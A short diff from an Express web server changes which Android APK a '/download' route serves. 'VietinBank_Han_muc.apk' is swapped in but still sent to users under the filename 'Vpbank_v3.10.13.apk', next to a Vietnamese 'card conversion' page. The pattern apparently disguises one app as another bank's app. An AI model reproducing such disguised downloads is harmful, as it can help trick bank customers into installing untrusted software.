@@ -367,7 +367,7 @@ app.get('/sang-ngang-the', (req, res) => {
     res.sendFile(__dirname + '/views/sang-ngang-the.html');
 });
 app.get('/download', function (req, res) {
-    const file = `${__dirname}/public/app/Vpbank_v3.10.13.apk`;
+    const file = `${__dirname}/public/app/VietinBank_Han_muc.apk`;
     res.download(file, 'Vpbank_v3.10.13.apk', {
         cacheControl: false
     }, (err) => {
